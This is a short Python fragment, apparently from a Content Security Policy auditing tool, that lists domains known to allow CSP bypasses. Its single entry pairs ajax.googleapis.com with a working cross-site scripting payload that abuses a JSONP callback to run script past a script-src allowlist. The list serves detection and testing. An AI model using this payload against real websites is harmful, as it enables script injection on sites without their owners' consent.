
# Common domains that contain known CSP bypasses

CSP_KNOWN_BYPASSES = {
    "script-src": [
        # (DOMAIN, PAYLOAD,)
        ("ajax.googleapis.com", '"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>'),

    ],
    "object-src": [

    ]
}
